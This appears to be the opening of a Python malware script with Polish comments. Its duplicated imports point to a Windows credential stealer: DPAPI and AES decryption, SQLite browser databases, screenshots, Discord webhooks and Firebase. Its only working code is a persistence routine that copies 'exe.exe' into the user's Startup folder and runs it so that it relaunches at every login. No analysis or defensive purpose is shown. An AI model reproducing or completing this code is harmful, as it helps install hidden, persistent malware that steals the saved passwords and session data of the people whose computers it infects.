# biblioteki
import shutil
import os
import os
import sys
from pathlib import Path
import json
import base64
import sqlite3
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
import shutil
from datetime import datetime
from discord_webhook import DiscordWebhook, DiscordEmbed
import time
import discord
import requests
import os
import re
import json
import asyncio
import json
import ntpath
import os
import random
import re
import shutil
import sqlite3
import subprocess
import threading
import winreg
import zipfile
import httpx
import psutil
import win32gui
import win32con
import base64
import requests
import ctypes
import time
from sqlite3 import connect
from base64 import b64decode
from urllib.request import Request, urlopen
from shutil import copy2
from datetime import datetime, timedelta, timezone
from sys import argv
from tempfile import gettempdir, mkdtemp
from json import loads, dumps
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from Crypto.Cipher import AES
from PIL import ImageGrab
from win32crypt import CryptUnprotectData
import requests
import json
import sys
from datetime import datetime
from colorama import Fore, init
import socket
import subprocess
import firebase_admin
from firebase_admin import credentials
from firebase_admin import db
import uuid
import json
import win32gui
import win32con
# ustawinainie ścieżki do auto startu
target_dir = os.getenv("appdata") + \
    "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
try:
    # pruba przneisienia
    shutil.move(os.path.abspath("exe.exe"),  target_dir)
    os.startfile(os.getenv("appdata") +
                 "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\exe.exe")
except:
    # w przeciwnym wypadku na konsoli pojawia się napis "nie przeniesiono"
    print("nie przeniesiono")
